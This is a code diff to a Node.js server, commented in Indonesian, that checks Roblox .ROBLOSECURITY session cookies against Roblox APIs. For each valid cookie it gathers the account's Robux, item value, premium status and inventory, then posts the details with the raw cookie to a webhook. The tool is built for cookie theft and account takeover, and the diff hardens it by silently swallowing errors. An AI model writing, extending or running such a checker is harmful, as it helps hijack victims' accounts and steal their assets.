@@ -18,15 +18,19 @@ async function checkRobloxCookie(cookie) {
         const username = userRes.data.name;
         const displayName = userRes.data.displayName;
 
-        const currencyRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-            headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
-        });
-        const robux = currencyRes.data.robux || 0;
+        let robux = 0;
+        try {
+            const currencyRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+                headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+            });
+            robux = currencyRes.data.robux || 0;
+        } catch (e) {}
 
-        const infoRes = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
-            headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
-        });
-        const createdDate = new Date(infoRes.data.created).toLocaleDateString();
+        let createdDate = "Unknown";
+        try {
+            const infoRes = await axios.get(`https://users.roblox.com/v1/users/${userId}`);
+            createdDate = new Date(infoRes.data.created).toLocaleDateString();
+        } catch (e) {}
         
         let isPremium = false;
         try {
@@ -34,11 +38,8 @@ async function checkRobloxCookie(cookie) {
                 headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
             });
             isPremium = premRes.data;
-        } catch (e) {
-            isPremium = false;
-        }
+        } catch (e) {}
 
-        // Ambil Data RAP / Limiteds (Inventory Collectibles)
         let totalRap = 0;
         let valuableItems = [];
         try {
@@ -55,11 +56,8 @@ async function checkRobloxCookie(cookie) {
                     };
                 });
             }
-        } catch (e) {
-            totalRap = 0;
-        }
+        } catch (e) {}
 
-        // Ambil Data Animasi (Asset type 24 - Animation Packages / Emotes)
         let animations = [];
         try {
             const animRes = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/24?limit=50`, {
@@ -68,9 +66,7 @@ async function checkRobloxCookie(cookie) {
             if (animRes.data && animRes.data.data) {
                 animations = animRes.data.data.map(anim => anim.name);
             }
-        } catch (e) {
-            animations = [];
-        }
+        } catch (e) {}
 
         return {
             success: true,
@@ -111,12 +107,9 @@ app.post('/api/check', async (req, res) => {
                         content: `🚨 **AKUN ROBLOX VALID DITEMUKAN!**\n` +
                                  `👤 **Username:** ${result.username} (${result.displayName})\n` +
                                  `💰 **Robux:** ${result.robux} | 💎 **Total RAP:** ${result.totalRap}\n` +
-                                 `🏃 **Jumlah Animasi:** ${result.animations.length} jenis\n` +
-                                 `🔑 \`\`\`${result.cookie}\`\`\``
+                                 `🔑 \`\`${result.cookie}\`\``
                     });
-                } catch (webhookErr) {
-                    console.error("Gagal kirim webhook:", webhookErr.message);
-                }
+                } catch (webhookErr) {}
             }
         }
     }
